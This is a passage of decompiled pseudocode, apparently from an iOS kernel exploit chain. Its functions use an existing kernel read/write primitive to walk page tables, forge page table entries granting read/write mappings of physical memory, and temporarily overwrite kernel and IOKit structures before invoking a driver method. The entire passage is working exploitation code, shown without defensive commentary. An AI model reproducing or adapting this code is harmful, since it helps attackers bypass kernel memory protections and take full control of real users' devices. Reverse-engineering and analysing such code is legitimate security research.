  v9 = result + ((a2 >> 22) & 0x3FF8);
  if ( !(unsigned int)krw_read_thunk(krwCtx, v9, 8, &v11) || (v11 & 1) == 0 )
    return 0;
  if ( (v11 & 2) == 0 )
  {
    result = v11 & 0xFFFFFE000000LL;
    if ( !a3 )
      return result;
LABEL_13:
    *a3 = v9;
    return result;
  }
  if ( (a4 & 1) != 0 )
    result = read_cryptex_manifest(krwCtx, v11 & 0xFFFFFFFFC000LL);
  else
    result = resolve_physpage_addr(krwCtx, v11 & 0xFFFFFFFFC000LL);
  if ( result )
  {
    v9 = result + ((a2 >> 11) & 0x3FF8);
    if ( (unsigned int)krw_read_thunk(krwCtx, v9, 8, &v10) && (v10 & 1) != 0 )
    {
      result = v10 & 0xFFFFFFFFC000LL;
      if ( !a3 )
        return result;
      goto LABEL_13;
    }
    return 0;
  }
  return result;
}

//----- (0000000000018FCC) ----------------------------------------------------
__int64 __fastcall get_pgtable_walk_result(struct_krwCtx *krwCtx, unsigned __int64 a2, uint64_t *a3)
{
  unsigned __int64 v6; // x0
  __int64 result; // x0

  v6 = read_pgtable_entry(krwCtx, a2, 0, 0);
  if ( !v6 )
    return 163855;
  result = physmap_map_cached(krwCtx, v6, (__int64)(a3 + 3));
  if ( !(uint32_t)result )
  {
    *a3 = a3[3];
    a3[1] = a2;
    a3[2] = (unsigned int)krwCtx->pageSizeOrSomething;
  }
  return result;
}

//----- (0000000000019040) ----------------------------------------------------
__int64 __fastcall setup_physmap_page_with_size(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3)
{
  unsigned __int64 v6; // x0
  __int64 v7; // x21
  unsigned __int64 v8; // x23
  int v9; // w0
  bool v10; // zf
  __int64 v11; // x22
  __int64 v12; // x0
  vm_size_t size[4]; // [xsp+4h] [xbp-5Ch] BYREF
  __int64 v15; // [xsp+28h] [xbp-38h]

  LODWORD(size[0]) = 0x4000;
  v6 = alloc_physmap_page(krwCtx, (unsigned int *)size);
  if ( !v6 )
    return 708617;
  v7 = v6;
  pgtable_walk_wrapper(krwCtx, v6 & ~krwCtx->pageMask, (__int64)size + 4);
  v8 = v15 & 0xFFFFFFFFC000LL;
  if ( v9 )
    v10 = v8 == 0;
  else
    v10 = 1;
  if ( v10 )
  {
    v11 = 163855;
LABEL_11:
    map_shared_mem_and_transfer_data(krwCtx, v7, LODWORD(size[0]));
    return v11;
  }
  v12 = setup_physmap_rw_multi(krwCtx, a2, v15 & 0xFFFFFFFFC000LL);
  v11 = v12;
  if ( (uint32_t)v12 )
    goto LABEL_11;
  v11 = physmap_map_cached(krwCtx, v8, a3);
  if ( (uint32_t)v11 )
    goto LABEL_11;
  return v11;
}
// 190A0: variable 'v9' is possibly undefined

//----- (0000000000019128) ----------------------------------------------------
__int64 __fastcall setup_physmap_rw_multi(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3)
{
  // struct_krwCtx *krwCtx; // x23
  uint64_t *v3; // x25
  __int64 v4; // x8
  unsigned __int64 v5; // x27
  int v6; // w24
  int v7; // w26
  unsigned __int64 v8; // x9
  __int64 v13; // x19
  int v14; // w26
  unsigned __int64 v15; // x0
  __int64 v17; // x24
  unsigned __int64 v18; // x0
  unsigned __int64 v19; // x23
  int v20; // w0
  uint32_t size[3]; // [xsp+4h] [xbp-8Ch] BYREF
  __int64 v22; // [xsp+10h] [xbp-80h] BYREF
  uint64_t v23[4]; // [xsp+18h] [xbp-78h] BYREF
  __int64 v24; // [xsp+38h] [xbp-58h]

    krwCtx = krwCtx;
  v3 = krwCtx->dmaFailCtx;
  v4 = v3[96];
  size[0] = 0x4000;
  v5 = a2 + 0x8000000000LL;
  v6 = a2 + 0x8000000000LL >= 0x1FFC001;
  v7 = a2 + 0xFFE000000LL < 0x1FFC001;
  v8 = v3[98];
  if ( v8 <= a2 && v8 + 0x2000000 > a2 )
    return 0xFFFFFFFFLL;
  v13 = 163855;
  if ( (unsigned int)krw_read_thunk(krwCtx, v4 + ((a2 >> 33) & 0x38), 8, &v22) )
  {
    v14 = v6 && v7;
    if ( v5 >= 0x1FFC001 )
    {
      if ( v14 )
      {
        v15 = v3[97];
        if ( !v15 )
          return v13;
      }
      else
      {
        v15 = read_cryptex_manifest(krwCtx, v22 & 0xFFFFFFFFC000LL);
        if ( !v15 )
          return v13;
      }
    }
    else
    {
      v15 = v3[159];
      if ( !v15 )
        return v13;
    }
    v17 = v15 + ((a2 >> 22) & 0x3FF8);
    if ( !(unsigned int)krw_read_thunk(krwCtx, v17, 8, &size[1]) )
      return v13;
    if ( (size[1] & 1) == 0 )
    {
      v18 = alloc_physmap_scratch_page(krwCtx, size);
      if ( !v18 )
        return 708617;
      v19 = v18;
      pgtable_walk_wrapper(krwCtx, v18 & ~krwCtx->pageMask, (__int64)v23);
      if ( v20 && (v24 & 0xFFFFFFFFC000LL) != 0 )
      {
        *(uint64_t *)&size[1] = (v24 & 0xFFFFFFFFC000LL) | 0x460000000000603LL;
        if ( (unsigned int)kwrite_with_retry(krwCtx, v17, (__int64)&size[1], 8) )
        {
          if ( v14 )
            v3[161] = v19;
LABEL_29:
          v23[0] = a3 | 0x60000000000443LL;
          if ( (unsigned int)kwrite_with_retry(krwCtx, v19 + ((a2 >> 11) & 0x3FF8), (__int64)v23, 8) )
            return 0;
          else
            return 163856;
        }
        v13 = 163856;
      }
      map_shared_mem_and_transfer_data(krwCtx, v19, size[0]);
      return v13;
    }
    if ( v5 >= 0x1FFC001 )
    {
      if ( v14 )
      {
        v19 = v3[161];
      }
      else
      {
        v19 = read_cryptex_manifest(krwCtx, size[1] & 0xFFFFFFFFC000LL);
        if ( !v19 )
          return v13;
      }
    }
    else
    {
      v19 = v3[160];
    }
    goto LABEL_29;
  }
  return v13;
}
// 19284: variable 'v20' is possibly undefined

//----- (0000000000019354) ----------------------------------------------------
void __fastcall setup_macho_section_dispatch(struct_krwCtx *krwCtx, __int64 a2, int a3)
{
  uint64_t *v3; // x8
  __int64 v4; // x10
  __int64 v5; // x9
  uint64_t *v6; // x8

  v3 = krwCtx->dmaFailCtx;
  v4 = v3[75];
  v5 = v3[76];
  v6 = (uint64_t *)v3[85];
  *(uint64_t *)v4 = v5 + 512;
  *(uint32_t *)(v4 + 512) = 9;
  *(uint32_t *)(v4 + 12) = 10;
  *(uint32_t *)(v4 + 32) = 1;
  *(uint32_t *)(v4 + 40) = 1;
  *(uint64_t *)(v4 + 44) = v5 + 768;
  *(uint32_t *)(v4 + 76) = 0;
  *(uint32_t *)(v4 + 112) = 0;
  *(uint64_t *)(v4 + 768) = a2;
  *(uint32_t *)(v4 + 784) = a3;
  *(uint64_t *)(v4 + 1024) = v5;
  *(uint64_t *)(v4 + 1176) = v5;
  *(uint64_t *)(v4 + 1184) = v5;
  while ( *v6 )
    ;
  *v6 = v5 + 1024;
}

//----- (00000000000193C0) ----------------------------------------------------
__int64 __fastcall get_kernel_version_build_0(struct_krwCtx *krwCtx, __int64 a2, int a3)
{
  // struct_krwCtx *krwCtx; // x24
  __int64 v6; // x24
  __int64 v7; // x0
  __int64 v8; // x23
  __int64 v9; // x19
  int v10; // w8
  __int64 v11; // x9
  unsigned int v12; // w21
  kern_return_t v13; // w0
  uint8_t v15[8]; // [xsp+18h] [xbp-D8h] BYREF
  __int64 v16; // [xsp+20h] [xbp-D0h] BYREF
  unsigned int v17; // [xsp+2Ch] [xbp-C4h] BYREF
  int v18; // [xsp+30h] [xbp-C0h] BYREF
  int v19; // [xsp+34h] [xbp-BCh] BYREF
  __int16 v20[2]; // [xsp+38h] [xbp-B8h] BYREF
  unsigned int v21; // [xsp+3Ch] [xbp-B4h] BYREF
  __int64 v22; // [xsp+40h] [xbp-B0h] BYREF
  __int64 v23; // [xsp+48h] [xbp-A8h] BYREF
  __int64 inputStruct; // [xsp+50h] [xbp-A0h] BYREF
  __int128 v25; // [xsp+58h] [xbp-98h]
  __int128 v26; // [xsp+68h] [xbp-88h]
  __int128 v27; // [xsp+78h] [xbp-78h]
  uint64_t input; // [xsp+88h] [xbp-68h] BYREF
  __int128 v29; // [xsp+90h] [xbp-60h]
  __int64 v30; // [xsp+A0h] [xbp-50h]

  v23 = a2;
  v6 = krwCtx->dmaFailCtx;
  v21 = 0x4000;
  v7 = alloc_physmap_page(krwCtx, &v21);
  if ( !v7 )
    return 708617;
  v8 = v7;
  v9 = 163856;
  v20[0] = 256;
  if ( (unsigned int)kwrite_with_retry(krwCtx, v7, (__int64)v20, 2) )
  {
    if ( !kread_physmap_decorated(
            krwCtx,
            *(uint64_t *)(v6 + 232) + *(unsigned int *)(v6 + 184),
            (unsigned __int64 *)&v22)
      || !(unsigned int)krw_read_thunk(
                          krwCtx,
                          *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 180),
                          4,
                          &v19)
      || !(unsigned int)krw_read_thunk(
                          krwCtx,
                          *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 196),
                          4,
                          &v18)
      || !(unsigned int)krw_read_thunk(
                          krwCtx,
                          *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 192),
                          4,
                          &v17)
      || !kread_physmap_decorated(
            krwCtx,
            *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 188),
            (unsigned __int64 *)&v16) )
    {
      return 163855;
    }
    if ( !v16 )
      return 0xFFFFFFFFLL;
    if ( (unsigned int)krw_read_thunk(krwCtx, v16 + *(unsigned int *)(v6 + 172), 8, v15) )
    {
      if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
        v10 = 65539;
      else
        v10 = 65538;
      v11 = *(uint64_t *)(v6 + 152);
      *(uint32_t *)v11 = v10;
      *(uint32_t *)(v11 + 4) = 16;
      *(uint16_t *)(v11 + 8) = 0;
      *(__int128 *)(*(uint64_t *)(v6 + 160) + 8LL) = xmmword_43200;
      input = *(unsigned int *)(v6 + 12);
      v29 = xmmword_43750;
      v30 = 56;
      v26 = 0u;
      v27 = 0u;
      v25 = 0u;
      inputStruct = *(uint64_t *)(v6 + 28);
      v23 = a2 - v17;
      if ( kwrite64(krwCtx, *(uint64_t *)(v6 + 232) + *(unsigned int *)(v6 + 184), v8) )
      {
        if ( noppl_kwrite32(krwCtx, *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 180), 1) )
        {
          if ( noppl_kwrite32(krwCtx, *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 196), a3 - 256) )
          {
            v12 = 163856;
            if ( (unsigned int)kwrite_with_retry(krwCtx, v16 + *(unsigned int *)(v6 + 172), (__int64)&v23, 8) )
            {
              v13 = IOConnectCallMethod(*(uint32_t *)(v6 + 8), 0x1Au, &input, 4u, &inputStruct, 0x38u, 0, 0, 0, 0);
              v12 = v13 ? v13 | 0x80000000 : 0;
              if ( !(unsigned int)kwrite_with_retry(krwCtx, v16 + *(unsigned int *)(v6 + 172), (__int64)v15, 8) )
                v12 = 163856;
            }
            if ( !noppl_kwrite32(krwCtx, *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 196), v18) )
              v12 = 163856;
          }
          else
          {
            v12 = 163856;
          }
          if ( !noppl_kwrite32(krwCtx, *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 180), v19) )
            v12 = 163856;
        }
        else
        {
          v12 = 163856;
        }
        if ( kwrite64(krwCtx, *(uint64_t *)(v6 + 232) + *(unsigned int *)(v6 + 184), v22) )
          return v12;
        else
          return 163856;
      }
    }
    else
    {
      return 163855;
    }
  }
  return v9;
}
// 43200: using guessed type __int128 xmmword_43200;
// 43750: using guessed type __int128 xmmword_43750;

